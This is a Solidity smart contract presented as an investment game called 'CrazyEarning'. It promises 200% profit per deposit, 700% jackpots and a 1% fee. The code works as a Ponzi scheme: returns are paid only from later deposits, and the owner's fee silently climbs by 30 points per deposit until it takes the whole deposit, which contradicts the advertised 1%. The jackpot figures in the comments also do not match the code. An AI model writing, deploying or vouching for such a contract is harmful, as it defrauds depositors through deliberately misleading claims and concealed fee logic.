1 //------------------------------------------------Crazy Earning--------------------------------------------------------------
2 //
3 // Prepare yourself for the biggest earning game out there! You will earn 200% profit after each deposit!
4 // Every 10th depositor will earn 700% profit. This is the craziest investment game, because it can make you rich very fast!
5 //
6 // There is only a 1% fee, everything else goes to the investors! 
7 //
8 // Minimum Deposit: 0.4 Ether (400 Finney)!
9 //
10 // Start earning NOW!
11 //
12 //---------------------------------------------------------------------------------------------------------------------------
13 contract CrazyEarning{
14 struct earnerarray{
15 address etherAddress;
16 uint amount;
17 }
18 earnerarray[] public crazyearners;
19 uint public deposits_until_jackpot=0;
20 uint public totalearners=0; uint public feerate=1;uint public profitrate=200;uint public jackpotrate=700; uint alpha=1; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalmoneyearned=0;
21 address public owner; modifier onlyowner{if(msg.sender==owner)_}
22 function CrazyEarning(){
23 owner=msg.sender;
24 }
25 function(){
26 enter();
27 }
28 function enter(){
29 if(msg.value<400 finney){
30 return;
31 }
32 uint amount=msg.value;uint tot_pl=crazyearners.length;totalearners=tot_pl+1;
33 deposits_until_jackpot=20-(totalearners%20);
34 crazyearners.length+=1;crazyearners[tot_pl].etherAddress=msg.sender;
35 crazyearners[tot_pl].amount=amount;
36 feeamount=amount*alpha/100;balance+=amount;totaldeposited+=amount;
37 if(feeamount!=0){if(balance>feeamount){owner.send(feeamount);balance-=feeamount;
38 totalmoneyearned+=feeamount;if(alpha<100)alpha+=30;
39 else alpha=100;}} uint payout;uint nr=0;
40 
41 
42 while(balance>crazyearners[nr].amount*200/100 && nr<tot_pl)
43 {
44 if(nr%10==0&&balance>crazyearners[nr].amount*700/100)
45 {
46 payout=crazyearners[nr].amount*700/100;
47 crazyearners[nr].etherAddress.send(payout);
48 balance-=crazyearners[nr].amount*700/100;
49 totalmoneyearned+=crazyearners[nr].amount*700/100;
50 }
51 else
52 {
53 payout=crazyearners[nr].amount*200/100;
54 crazyearners[nr].etherAddress.send(payout);
55 balance-=crazyearners[nr].amount*200/100;
56 totalmoneyearned+=crazyearners[nr].amount*200/100;
57 }
58 nr+=1;
59 }}}